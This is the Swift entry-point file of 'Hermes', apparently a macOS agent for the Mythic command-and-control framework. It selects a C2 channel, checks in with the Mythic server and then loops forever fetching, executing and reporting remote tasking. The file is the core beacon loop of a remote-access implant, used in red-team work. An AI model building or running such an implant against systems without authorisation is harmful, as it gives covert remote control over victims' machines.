//
//  main.swift
//  Hermes
//
//  Created by slyd0g on 5/18/21.
//  Updated to support multiple C2 profiles
//

import Foundation

// Initialize the C2 profile manager based on configuration
func initializeC2Profile() -> Bool {
    let profileTypeString = agentConfig.c2ProfileType.lowercased()
    let profileType: C2ProfileType
    
    switch profileTypeString {
    case "websocket":
        profileType = .websocket
    case "http":
        profileType = .http
    case "github":
        profileType = .github
    default:
        profileType = .http
    }
    
    profileManager = C2ProfileManager(profileType: profileType)
    return profileManager.initializeProfile()
}

// Initialize C2 profile
if (!initializeC2Profile()) {
    print("Failed to initialize C2 profile")
    exit(0)
}

// Perform key exchange or plaintext checkin based on configuration
if (agentConfig.encryptedExchangeCheck) {
    // Encrypted key exchange to grab new AES key from Mythic per implant
    if (!encryptedKeyExchange()) {
        exit(0)
    }
} else {
    // Plaintext checkin without encryption
    if (!plaintextCheckin()) {
        exit(0)
    }
}

// Begin main program execution: check kill date, sleep, get tasking from Mythic, execute tasking from Mythic, post tasking to Mythic
var jobs = JobList()
while(true)
{
    checkKillDate()
    sleepWithJitter()
    do {
        try getTasking(jobList: jobs)
        executeJob(jobList: jobs)
        postResponse(jobList: jobs)
    }
    catch {
    }
    
}

